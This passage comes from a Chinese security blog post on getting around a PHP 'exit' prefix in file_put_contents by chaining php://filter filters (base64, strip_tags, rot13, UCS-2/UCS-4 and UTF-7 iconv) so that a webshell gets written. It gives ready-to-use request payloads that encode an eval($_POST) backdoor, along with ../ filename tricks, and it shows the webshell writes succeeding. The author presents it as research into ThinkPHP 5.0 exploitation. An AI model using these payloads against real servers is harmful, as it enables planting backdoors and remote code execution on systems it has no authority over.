+<h3 id="测试代码-2"><a href="#测试代码-2" class="headerlink" title="测试代码"></a>测试代码</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'&lt;?php exit();'</span><span class="token punctuation">.</span><span class="token variable">$a</span><span class="token punctuation">)</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这段代码在ThinkPHP5.0.X反序列化中出现过，利用其组合才能够得到RCE。有关ThinkPHP5.0.x的反序列化这里就不说了，主要是探索如何利用php://filter绕过该限制写入shell后门得到RCE的过程。</p>
+<h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>分析代码可以看到，这种情况下写入的文件，其文件名和文件部分内容一致，这就导致利用的难度大大增加了，不过最终目的还是相同的：都是为了去除文件头部内容<code>exit</code>这个关键代码写入shell后门。</p>
+<h3 id="convert-base64-1"><a href="#convert-base64-1" class="headerlink" title="convert.base64"></a>convert.base64</h3><p>在上面不同变量利用base64构造payload的基础上，可以针对相同变量再次构造相应payload，在文件名中包含，满足正常解码就可以。</p>
+<ul>
+<li>构造payload</li>
+</ul>
+<pre><code>a=php://filter/write=convert.base64-decode/resource=PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+.php
+
+//注意payload中的字符&#39;+&#39;在浏览器中需要转换为%2B</code></pre><p>正常情况下都会想到使用上述payload进行利用，但是这样构造发现是不可以的，因为构造的payload里面包含<code>&#39;=&#39;</code>符号，熟悉base64编码的应该知道<code>&#39;=&#39;</code>号在base64编码中起填充作用，也就意味着后面的结束，正是因为这样，当base64解码的时候如果字符<code>&#39;=&#39;</code>后面包含有其他字符则会报错。具体见上文提到的先知的两篇文章里面都有提到使用base64编码所遇到的问题，里面也有提到即使关键字<code>read、write</code>可以去除，但是<code>resource</code>关键字不能少，也就导致不能直接使用这种方式去绕过。</p>
+<p>下面可以进行测试验证有关字符<code>&#39;=&#39;</code>在base64解码中的问题</p>
+<pre><code>&gt;&gt;&gt; base64.b64decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+&quot;)
+&gt;&gt;&gt; base64.b64decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+=&quot;)
+&gt;&gt;&gt; base64.b64decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+=q&quot;)</code></pre><p><img src="/2020/04/03/php-filter-tricks/1594459-20200403210314027-750624911.png" alt></p>
+<p>从测试的结果来看base64解码的时候字符<code>&#39;=&#39;</code>后面确实不能包含有其他字符，通过参考上述先知的两篇文章以及p牛的方法就可以绕过base64编码由于等号字符造成的问题，有关分析见下面相关过滤器部分。</p>
+<h3 id="string-strip-tags-2"><a href="#string-strip-tags-2" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h3><p>这里关于<code>string.strip_tags</code>分两种环境去测试分析：这里限制条件同样在相同变量下</p>
+<pre><code># 第一种
+&lt;?php exit;
+
+# 第二种
+&lt;?php exit; ?&gt;</code></pre><h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><p>由于上面<code>Bypass-不同变量</code>这种情况下的限制代码直接就是<code>&lt;?php exit; ?&gt;</code>可以直接利用<code>strip_tags</code>去掉，但是现在这种情况下的限制代码和上面的有点不一样了，少了一段字符<code>?&gt;</code>，其限制代码为<code>&lt;?php exit;</code>，不过构造的目的是相同的最终还是要把<code>exit;</code>给去除掉。</p>
+<p>分析两者限制代码的不同，那么我们可以直接再给它加一个<code>?&gt;</code>字符串进行闭合就可以利用了</p>
+<ul>
+<li>构造payload</li>
+</ul>
+<pre><code>a=php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+.php</code></pre><ul>
+<li>代码合并</li>
+</ul>
+<pre><code>&lt;?php  exit();php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+.php</code></pre><p>分析合并后的代码文件内容，发现成功的构造php标签<code>&lt;?php xxxx ?&gt;</code>，同时也可以发现代码中的字符等号’=’也包含在php标签里面，那么在经过strip_tags处理的时候都会去除掉，之后就不会影响base64的正常解码了。</p>
+<ul>
+<li>载荷效果</li>
+</ul>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403214144157-1464148231.png" alt></p>
+<p>可以看到payload请求成功，在服务器上生成了相应的文件，同时也正常的写入了webshell</p>
+<p>虽然这样利用成功了，但是会发现这样的文件访问会有问题的，采用<code>@Cyc1e</code>师傅里面介绍的方法，利用<code>../</code>重命名即可解决。【关于这种方法<code>../</code>其实先知的两篇文章ThinkPHP5.0反序列化利用链里面的payload就存在<code>../</code>，还是太菜了当时只分析了使用什么过滤器可以进行绕过 emmmm……】</p>
+<ul>
+<li>利用技巧</li>
+</ul>
+<pre><code>a=php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+/../Qftm.php</code></pre><p>把<code>?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+</code>作为目录名（不管存不存在），再用<code>../</code>回退一下，这样创建出来的文件名为Qftm.php，这样创建出来的文件名就正常了。</p>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403224231674-1407594357.png" alt></p>
+<p>有一个缺点就是这种利用手法在windows下利用不成功，因为文件名里面的<code>? &gt;</code>等这些是特殊字符会导致文件的创建失败，关于这个问题上面先知的第一篇文章中也有提到这个问题，以及对于这种问题的解决方法：使用<code>convert.iconv.utf-8.utf-7|convert.base64-decode</code>进行绕过；同时也可以借鉴<code>@Cyc1e</code>师傅文章里面介绍的方法，利用非php://filter过滤器写入payload进行绕过，生成正常文件名；利用这两种方法既可以在Linux下写入文件也可以在Windows下写入文件，具体见下面相关过滤器利用。</p>
+<h4 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'&lt;?php exit; ?>'</span><span class="token punctuation">.</span><span class="token variable">$a</span><span class="token punctuation">)</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>对于这种情况主要是限制代码本身是闭合的同时有关变量相同，对于这种问题可以借鉴上面先知的第二篇文章有关解决方法，使用<code>string.strip_tags|convert.base64</code>过滤进行绕过。</p>
+<ul>
+<li>构造payload</li>
+</ul>
+<pre><code>php://filter/%3C|string.strip_tags|convert.base64-decode/resource=%3EPD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8%2B/../Qftm.php</code></pre><p>关于过滤器里面写入<code>&lt;|</code>这个过滤器，虽然php://filter里面没有但是不会爆出致命错误具有一定的兼容性。由于base64解码受字符<code>&#39;=&#39;</code>的限制，那么则可以将其闭合在标签里面进行剔除，然后再进行base64解码。</p>
+<ul>
+<li>利用</li>
+</ul>
+<p><img src="/2020/04/03/php-filter-tricks/t0186ec4a78f3329994.jpg" alt="t0186ec4a78f3329994"></p>
+<p>这种方法同样无法在Windows下写入文件只限于Linux下（特殊字符的存在导致）。</p>
+<h3 id="string-rot13-2"><a href="#string-rot13-2" class="headerlink" title="string.rot13"></a>string.rot13</h3><p>这种方法在<code>Bypass-不同变量</code>中的短标签过滤器可以直接拿到使用进行绕过，间接性构造相应的payload，这里的限制不需要闭合<code>exit;</code>也可以利用。</p>
+<ul>
+<li>构造payload</li>
+</ul>
+<pre><code>a=php://filter/write=string.rot13/resource=&lt;?cuc @riny($_CBFG[Dsgz])?&gt;/../Qftm.php
+a=php://filter/write=string.rot13/resource=?&gt;&lt;?cuc @riny($_CBFG[Dsgz])?&gt;/../Qftm.php</code></pre><ul>
+<li>载荷效果</li>
+</ul>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403231444501-87282938.png" alt></p>
+<p>可以看到payload利用成功，生成目标恶意代码文件，同时恶意代码文件访问执行成功</p>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403231633179-824183828.png" alt></p>
+<p>针对<code>string.rot13</code>这种Bypass手段，还有另一种方法可以生成正常文件，也就是上面提到的，利用非php://filter过滤器写入payload进行绕过，生成正常文件名，虽然该过滤器不存在但是php://filter处理的时候只会显示警告信息不影响后续代码流程的执行（关于这个方法原理也就类似上面<code>string.strip_stags</code>的第二种情况通过将<code>&lt;</code>不存在的过滤器写入过滤器中闭合后续标签剔除特殊字符）。</p>
+<ul>
+<li>构造payload</li>
+</ul>
+<pre><code>a=php://filter/write=string.rot13|&lt;?cuc @riny($_CBFG[Dsgz])?&gt;/resource=Qftm.php</code></pre><p>这种构造可以使得恶意代码不会存在文件名中，避免了一下文件名因包含特殊字符而出错，当然这种构造在windows下一样可以正常利用。</p>
+<ul>
+<li>载荷效果</li>
+</ul>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403232109402-2122630306.png" alt></p>
+<h3 id="convert-iconv-1"><a href="#convert-iconv-1" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h3><p>关于<code>convert.iconv.*</code>的详细介绍可以看上面对php://filter的介绍。</p>
+<p>对于iconv字符编码转换进行绕过的手法，其实类似于上面所述的base64编码手段，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制<code>exit;</code>去除，而我们的恶意代码正常解码存储。</p>
+<h4 id="UCS-2"><a href="#UCS-2" class="headerlink" title="UCS-2"></a>UCS-2</h4><p>UCS-2编码转换</p>
+<pre><code>php &gt; echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#39;&lt;?php @eval($_POST[Qftm]);?&gt;&#39;);
+
+?&lt;hp pe@av(l_$OPTSQ[tf]m;)&gt;?
+
+&gt;&gt;&gt; len(&quot;&lt;?php @eval($_POST[Qftm]);?&gt;&quot;)
+28 -&gt; 2*14
+&gt;&gt;&gt;</code></pre><p>通过UCS-2方式，对目标字符串进行2位一反转（这里的2LE和2BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-2中2的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了</p>
+<ul>
+<li>构造payload</li>
+</ul>
+<pre><code>a=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSQ[tf]m;)&gt;?/resource=Qftm.php
+
+合并的payload：
+&lt;?php exit();php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSQ[tf]m;)&gt;?/resource=Qftm.php
+
+核心部分：
+&lt;?php exit();php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSQ[tf]m;)&gt;?
+
+&gt;&gt;&gt; len(&quot;&lt;?php exit();php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSQ[tf]m;)&gt;?&quot;)
+84 -&gt; 2*42
+&gt;&gt;&gt;</code></pre><ul>
+<li>载荷效果</li>
+</ul>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200404002907840-1148216294.png" alt></p>
+<p>从请求和服务器查看结果可以看到构造的payload执行传入恶意代码后门webshell成功。</p>
+<h4 id="UCS-4"><a href="#UCS-4" class="headerlink" title="UCS-4"></a>UCS-4</h4><p>UCS-4编码转换</p>
+<pre><code>php &gt; echo iconv(&quot;UCS-4LE&quot;,&quot;UCS-4BE&quot;,&#39;&lt;?php @eval($_POST[Qftm]);?&gt;&#39;);
+
+hp?&lt;e@ p(lavOP_$Q[TS]mtf&gt;?;)
+
+&gt;&gt;&gt; len(&quot;&lt;?php @eval($_POST[Qftm]);?&gt;&quot;)
+28 -&gt; 4*7
+&gt;&gt;&gt;</code></pre><p>通过UCS-4方式，对目标字符串进行4位一反转（这里的4LE和4BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-4中4的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了</p>
+<ul>
+<li>构造payload</li>
+</ul>
+<pre><code>a=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$Q[TS]mtf&gt;?;)/resource=Qftm.php
+
+合并的payload：
+&lt;?php exit();php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$Q[TS]mtf&gt;?;)/resource=Qftm.php
+
+核心部分：
+&lt;?php exit();php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$Q[TS]mtf&gt;?;)
+
+&gt;&gt;&gt; len(&quot;&lt;?php exit();php://filter/convert.iconv.UCS-4LE.UCS-4BE|&quot;)
+56 -&gt; 4*14
+&gt;&gt;&gt;</code></pre><ul>
+<li>载荷效果</li>
+</ul>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200404003445350-1425884495.png" alt></p>
+<p>从请求和服务器查看结果可以看到构造的payload执行传入恶意代码后门webshell成功。</p>
+<h4 id="utf8-utf7"><a href="#utf8-utf7" class="headerlink" title="utf8-utf7"></a>utf8-utf7</h4><ul>
+<li>测试代码</li>
+</ul>
+<pre><code>&lt;?php
+
+$a=&#39;php://filter/convert.iconv.utf-8.utf-7/resource=Qftm.txt&#39;;
+file_put_contents($a,&#39;=&#39;);
+
+/**
+Qftm.txt 写入的内容为: +AD0-
+**/</code></pre><p>从结果可以看到，convert.iconv 这个过滤器把 <code>=</code> 转化成了 <code>+AD0-</code>，要知道 <code>+AD0-</code> 是可以被 <code>convert.base64-decode</code>过滤器解码的。</p>
+<ul>
+<li>构造payload</li>
+</ul>
+<pre><code>a=php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=Qftm.php
+//这里需要注意的是要符合base64解码按照4字节进行的
+
+utf-8 -&gt; utf-7
++ADw?php exit()+ADs-php://filter/write+AD0-PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+-+AHw-convert.iconv.utf-8.utf-7/resource+AD0-Qftm.php
+
+base64解码特点剔除不符合字符（只要恶意代码前面部分正常就可以，长度为4的倍数）
++ADwphpexit+ADsphp//filter/write+AD0
+
+&gt;&gt;&gt; len(&quot;+ADwphpexit+ADsphp//filter/write+AD0&quot;)
+36 -&gt; 4*9
+&gt;&gt;&gt;
+
+正常base64解码部分
++ADwphpexit+ADsphp//filter/write+AD0PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+</code></pre><ul>
+<li>载荷效果</li>
+</ul>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200404013506787-630634811.png" alt></p>
+<p>可以看到这种转换过滤器编码转换效果是可以的，成功绕过了base64与<code>exit;</code>的限制。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过参考许多公开的部分技术文章进行探索、实践与总结，可以看到，其中提到了关于php://filter常用的过滤器利用与多种过滤器组合利用的手法及其非过滤器兼容性技巧来进行漏洞挖掘或者Bypass，可能关于php://filter还有其他很多的过滤器可以利用绕过，不过思路和各个文章中提到的都是一样的，都是通过某个过滤器或多个过滤器特定功能利用来绕过相应限制达到一定的目的。</p>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul>
+<li><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></li>
+<li><a href="https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA" target="_blank" rel="noopener">一次“SSRF–&gt;RCE”的艰难利用</a></li>
+<li><a href="https://xz.aliyun.com/t/7457" target="_blank" rel="noopener">Thinkphp5.0反序列化链在Windows下写文件的方法</a></li>
+<li><a href="https://xz.aliyun.com/t/7310" target="_blank" rel="noopener">关于 ThinkPHP5.0 反序列化链的扩展</a></li>
+<li><a href="[https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/](https://cyc1e183.github.io/2020/04/03/关于file_put_contents的一些小测试/)">关于file_put_contents的一些小测试</a></li>
+<li><a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">可用过滤器列表</a></li>
+</ul>
+<pre><code>文章首发于安全客：https://www.anquanke.com/post/id/202510</code></pre>
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Qftm</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://Qftm.github.io/2020/04/03/php-filter-tricks/">http://Qftm.github.io/2020/04/03/php-filter-tricks/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint polocy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">Qftm</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/PHP/">
+                                    <span class="chip bg-color">PHP</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2020/04/19/bypass-nodejs-jwt/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/featureimages/nodejs-1.jpg" class="responsive-img" alt="探索Node.js中JWT认证缺陷的绕过">
+                        
+                        <span class="card-title">探索Node.js中JWT认证缺陷的绕过</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            最近打比赛遇见一道Web题很有意思，考察的是Node.js中JWT认证问题，由于和自己以前所遇到的JWT认证绕过都不太一样，所以打算记录分析一下这个探索过程。
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-04-19
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    Web安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/JWT/">
+                        <span class="chip bg-color">JWT</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/03/25/Linux-Network-Protocol-Stack/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/featureimages/linux-1.png" class="responsive-img" alt="Linux Network Protocol Stack">
+                        
+                        <span class="card-title">Linux Network Protocol Stack</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            最近，发现网络协议栈这部分有缺陷，底层基础知识一点要熟练掌握。于是，打算开始深入学习理解Linux网络协议栈 23333！！！一切事物只有熟悉其底层原理，那么所有的问题都会迎刃而解。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/" class="post-category">
+                                    安全建设
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Linux/">
+                        <span class="chip bg-color">Linux</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%8D%8F%E8%AE%AE/">
+                        <span class="chip bg-color">协议</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + 'From: Qftm<br />'
+            + 'Author: Qftm<br />'
+            + 'Link: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2018</span>
+            <a href="/about" target="_blank">Qftm</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">370.8k</span>&nbsp;字
+            
+            
+            
+            
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/Qftm" 
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:Qftmbin@gmail.com" 
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+    <a href="https://twitter.com/Qftmer" 
+        <i class="fab fa-twitter"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
